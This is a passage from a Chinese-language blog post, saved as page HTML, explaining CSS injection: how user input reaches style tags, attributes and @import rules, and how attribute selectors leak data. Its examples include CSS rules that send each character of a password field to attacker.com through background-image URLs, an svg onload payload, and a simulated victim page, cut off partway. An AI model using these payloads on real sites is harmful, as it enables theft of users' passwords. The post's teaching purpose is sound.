@@ -1,0 +1,477 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CSS 注入 (CSS Injection) 详解 | 1024 维度</title><meta name="author" content="TeaTang"><meta name="copyright" content="TeaTang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CSS 注入 (CSS Injection) 是一种客户端攻击技术，攻击者通过在网页中注入恶意的 Cascading Style Sheets (CSS) 代码，从而实现对页面样式、布局的篡改，甚至是窃取用户信息、进行用户行为监控、绕过某些安全机制等目的。它与常见的 XSS (Cross-Site Scripting) 攻击有所不同，CSS 注入本身不会直接执行 JavaScript 代码，但其">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSS 注入 (CSS Injection) 详解">
+<meta property="og:url" content="https://blog.tbf1211.xx.kg/7420d7912dc7/index.html">
+<meta property="og:site_name" content="1024 维度">
+<meta property="og:description" content="CSS 注入 (CSS Injection) 是一种客户端攻击技术，攻击者通过在网页中注入恶意的 Cascading Style Sheets (CSS) 代码，从而实现对页面样式、布局的篡改，甚至是窃取用户信息、进行用户行为监控、绕过某些安全机制等目的。它与常见的 XSS (Cross-Site Scripting) 攻击有所不同，CSS 注入本身不会直接执行 JavaScript 代码，但其">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.tbf1211.xx.kg/img/cover/default_cover-13.jpg">
+<meta property="article:published_time" content="2025-07-30T22:24:00.000Z">
+<meta property="article:modified_time" content="2026-01-21T01:29:47.896Z">
+<meta property="article:author" content="TeaTang">
+<meta property="article:tag" content="计算机网络">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="2025">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.tbf1211.xx.kg/img/cover/default_cover-13.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CSS 注入 (CSS Injection) 详解",
+  "url": "https://blog.tbf1211.xx.kg/7420d7912dc7/",
+  "image": "https://blog.tbf1211.xx.kg/img/cover/default_cover-13.jpg",
+  "datePublished": "2025-07-30T22:24:00.000Z",
+  "dateModified": "2026-01-21T01:29:47.896Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "TeaTang",
+      "url": "https://blog.tbf1211.xx.kg"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon-1.ico"><link rel="canonical" href="https://blog.tbf1211.xx.kg/7420d7912dc7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><meta name="google-site-verification" content="NdIUXAOVyGnnBhcrip0ksCawbdAzT0hlBZDE9u4jx6k"/><meta name="msvalidate.01" content="567E47D75E8DCF1282B9623AD914701E"/><meta name="baidu-site-verification" content="code-pE5rnuxcfD"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: TeaTang","link":"链接: ","source":"来源: 1024 维度","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CSS 注入 (CSS Injection) 详解',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://jsd.012700.xyz"><link href="/self/btf.css" rel="stylesheet"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="1024 维度" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/loading.gif" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">507</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">227</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">84</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 我的轨迹</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/2023/"><i class="fa-fw fa-solid fa-bug"></i><span> 2023</span></a></li><li><a class="site-page child" href="/archives/2024/"><i class="fa-fw fa-solid fa-code"></i><span> 2024</span></a></li><li><a class="site-page child" href="/archives/2025/"><i class="fa-fw fa-solid fa-network-wired"></i><span> 2025</span></a></li><li><a class="site-page child" href="/archives/2026/"><i class="fa-fw fa-solid fa-code-branch"></i><span> 2026</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/cover/default_cover-13.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">1024 维度</span></a><a class="nav-page-title" href="/"><span class="site-name">CSS 注入 (CSS Injection) 详解</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 我的轨迹</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/2023/"><i class="fa-fw fa-solid fa-bug"></i><span> 2023</span></a></li><li><a class="site-page child" href="/archives/2024/"><i class="fa-fw fa-solid fa-code"></i><span> 2024</span></a></li><li><a class="site-page child" href="/archives/2025/"><i class="fa-fw fa-solid fa-network-wired"></i><span> 2025</span></a></li><li><a class="site-page child" href="/archives/2026/"><i class="fa-fw fa-solid fa-code-branch"></i><span> 2026</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CSS 注入 (CSS Injection) 详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2025-07-30T22:24:00.000Z" title="发表于 2025-07-31 06:24:00">2025-07-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">4.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>17分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p><strong>CSS 注入 (CSS Injection)</strong> 是一种客户端攻击技术，攻击者通过在网页中注入恶意的 Cascading Style Sheets (CSS) 代码，从而实现对页面样式、布局的篡改，甚至是<strong>窃取用户信息</strong>、进行<strong>用户行为监控</strong>、绕过某些安全机制等目的。它与常见的 XSS (Cross-Site Scripting) 攻击有所不同，CSS 注入本身不会直接执行 JavaScript 代码，但其危害不容小觑。</p>
+</blockquote>
+<div class="note info flat"><p>CSS 注入通常发生在 Web 应用程序未能正确净化或编码用户提供的输入，并将其不加识别地插入到 HTML <code>&lt;style&gt;</code> 标签、HTML 元素的 <code>style</code> 属性或外部 CSS 文件链接中时。它的强大之处在于能够利用 CSS 选择器和属性的特性，实现一些意想不到的攻击效果。</p>
+</div>
+<hr>
+<h2 id="一、CSS-注入的产生机制"><a href="#一、CSS-注入的产生机制" class="headerlink" title="一、CSS 注入的产生机制"></a>一、CSS 注入的产生机制</h2><p>CSS 注入的核心在于攻击者能够控制页面中 CSS 的一部分或全部。这通常发生在以下几种情况：</p>
+<ol>
+<li><p><strong>用户输入直接插入 <code>&lt;style&gt;</code> 标签内部</strong>：<br>当应用程序允许用户输入的数据直接被渲染到 HTML 页面中的 <code>&lt;style&gt;</code> 标签内部时，攻击者可以闭合现有 CSS 规则并注入新的恶意 CSS。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="comment">/* 应用程序提供的样式 */</span></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.user-text</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: &#123;&#123; user_supplied_color &#125;&#125;; <span class="comment">/* 易受攻击点 */</span></span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果 <code>user_supplied_color</code> 是 <code>red; &#125; .malicious-class &#123; background: url(&#39;http://attacker.com/leak&#39;); </code>，则会闭合 <code>color</code> 属性，并注入新的样式规则。</p>
+</li>
+<li><p><strong>用户输入插入 HTML 元素的 <code>style</code> 属性</strong>：<br>当应用程序允许用户输入的数据被渲染到 HTML 元素的 <code>style</code> 属性中时。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-color: &#123;&#123; user_supplied_background &#125;&#125;;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is content.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果 <code>user_supplied_background</code> 是 <code>blue; float: none; background-image: url(&#39;data:image/svg+xml,&lt;svg onload=alert(1)&gt;&#39;);</code>，可能会导致样式破坏甚至尝试 XSS (尽管浏览器通常会阻止 <code>data</code> URL 中的脚本)。</p>
+</li>
+<li><p><strong>用户输入作为 CSS 属性的值</strong>：<br>特别是那些接受 <code>url()</code> 函数的 CSS 属性（如 <code>background-image</code>, <code>border-image</code>, <code>cursor</code>, <code>list-style-image</code>, <code>content</code> 在 <code>:before</code> &#x2F; <code>:after</code> 中 <code>url()</code> ）。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.profile-image</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;&#123;&#123; user_supplied_image_url &#125;&#125;&#x27;</span>); <span class="comment">/* 易受攻击点 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果 <code>user_supplied_image_url</code> 是 <code>evil.com/leak.png?data=...</code>，攻击者可以控制图片请求的 URL。</p>
+</li>
+<li><p><strong>用户输入作为外部样式表的链接</strong>：<br>虽然不如直接注入常见，但如果应用程序动态生成 <code>&lt;link&gt;</code> 标签或 <code>@import</code> 规则时使用了未净化的用户输入，攻击者可以引入自己的恶意样式表。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; user_supplied_css_path &#125;&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>或者在 CSS 文件内部：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> url(<span class="string">&quot;&#123;&#123; user_supplied_css_path &#125;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>攻击者可以指向一个由他们控制的域名上的 CSS 文件。</p>
+</li>
+</ol>
+<h2 id="二、CSS-注入的潜在危害与攻击场景"><a href="#二、CSS-注入的潜在危害与攻击场景" class="headerlink" title="二、CSS 注入的潜在危害与攻击场景"></a>二、CSS 注入的潜在危害与攻击场景</h2><p>CSS 注入的攻击能力常常被低估，它可以实现以下多种恶意目的：</p>
+<h3 id="2-1-数据窃取-Data-Exfiltration"><a href="#2-1-数据窃取-Data-Exfiltration" class="headerlink" title="2.1 数据窃取 (Data Exfiltration)"></a>2.1 数据窃取 (Data Exfiltration)</h3><p>这是 CSS 注入最强大和最令人担忧的能力之一。攻击者可以利用 CSS 选择器，<strong>根据页面上某个元素的特定属性值，触发一个外部的 HTTP 请求，从而将该属性值“泄露”给攻击者。</strong></p>
+<p><strong>原理</strong>：CSS 属性选择器允许我们根据 HTML 元素的属性（如 <code>value</code>, <code>placeholder</code>, <code>data-*</code> 属性等）是否存在或其值的一部分来应用样式。当一个选择器匹配成功时，通常会应用相应的样式。攻击者可以利用那些会引起网络请求的 CSS 属性，如 <code>background-image: url(...)</code> 或 <code>list-style-image: url(...)</code>。</p>
+<p><strong>攻击示例：窃取用户输入的密码 (键盘记录)</strong></p>
+<p>假设有一个登录表单，其中密码输入框的 <code>name</code> 是 <code>password</code>，且当用户输入时，其 <code>value</code> 属性也会被更新。攻击者可以注入以下 CSS：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 注入的恶意 CSS */</span></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span> &#123; <span class="comment">/* 如果密码以 &#x27;a&#x27; 开头 */</span></span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://attacker.com/leak?c=a&quot;</span>); <span class="comment">/* 触发请求，泄露首字符为 &#x27;a&#x27; */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;p&quot;</span>]</span> &#123; <span class="comment">/* 如果密码以 &#x27;p&#x27; 开头 */</span></span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://attacker.com/leak?c=p&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* ... 对所有可能的字符 (a-z, A-Z, 0-9, 符号) 都创建一条规则 ... */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value$=<span class="string">&quot;a&quot;</span>]</span> &#123; <span class="comment">/* 如果密码以 &#x27;a&#x27; 结尾 */</span></span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://attacker.com/leak?last_c=a&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure>
+<p>通过逐个字符尝试，并监听 <code>attacker.com</code> 接收到的请求，攻击者可以逐步推断出受害者输入的密码。这是一种基于时间的盲注攻击。</p>
+<p><strong>更精细的键盘记录（通过探测密码长度和每个位置上的字符）：</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 探测密码长度 */</span></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value=<span class="string">&quot;&quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://attacker.com/len?len=0&quot;</span>); &#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value$=<span class="string">&quot;a&quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://attacker.com/leak?c=a&quot;</span>); &#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value*=<span class="string">&quot;a&quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://attacker.com/leak?c=a&quot;</span>); &#125;</span><br><span class="line"><span class="comment">/* ... 针对每个可能的字符 a-z, A-Z, 0-9 等 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 探测第一个字符 */</span></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a&quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://attacker.com/char?pos=1&amp;char=a&quot;</span>); &#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;b&quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://attacker.com/char?pos=1&amp;char=b&quot;</span>); &#125;</span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 探测第二个字符 */</span></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value^=<span class="string">&quot;a_any_char&quot;</span>]</span> &#123;  <span class="comment">/* 这里的 &#x27;_&#x27; 是占位符，实际需要更复杂的选择器组合或利用不同的 CSS 触发点 */</span> &#125;</span><br><span class="line"><span class="comment">/* 这种方法对探测后续字符需要更复杂的 CSS 技巧，例如利用 `:not()` 选择器或组合多个规则 */</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>示例代码 (HTML&#x2F;CSS for keypress logging):</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html (模拟受害者页面) --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 假设这里存在 CSS 注入点，用户输入可以被恶意插入 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 这里是恶意注入的 CSS */</span></span></span><br><span class="line"><span class="language-css">        <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-css">         * 恶意 CSS 注入点</span></span></span><br><span class="line"><span class="comment"><span class="language-css">         * 假设用户输入 `red; &#125; input[name=&quot;password&quot;][value$=&quot;a&quot;] &#123; background-image: url(&quot;http://attacker.com/log?key=a&quot;); &#125;`</span></span></span><br><span class="line"><span class="comment"><span class="language-css">         */</span></span></span><br><span class="line"><span class="language-css">         <span class="selector-class">.some-user-controlled-style</span> &#123;</span></span><br><span class="line"><span class="language-css">             <span class="attribute">color</span>: blue; <span class="comment">/* 用户输入的颜色，实际会被闭合 */</span></span></span><br><span class="line"><span class="language-css">         &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 攻击者注入的一部分，用于探测密码 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value$=<span class="string">&quot;a&quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://attacker.com/log?key=a&quot;</span>); &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value$=<span class="string">&quot;b&quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://attacker.com/log?key=b&quot;</span>); &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">&quot;password&quot;</span>]</span><span class="selector-attr">[value$=<span class="string">&quot;c&quot;</span>]</span> &#123; <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;http://attacker.com/log?key=c&quot;</span>); &#125;</span></span><br><span class="line"><span class="language-css">        <span class="comment">/* ... 对所有可能的字符进行探测，当用户输入时，每输入一个字符都会匹配到规则 */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 探测密码长度，例如通过 input[value*=&quot;...&quot;] + 计数器 */</span></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* input[name=&quot;password&quot;][value=&quot;&quot;] &#123; background-image: url(&quot;http://attacker.com/len?len=0&quot;); &#125; */</span></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* input[name=&quot;password&quot;][value*=&quot;.......&quot;] &#123; background-image: url(&quot;http://attacker.com/len?len=8+&quot;); &#125; */</span></span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 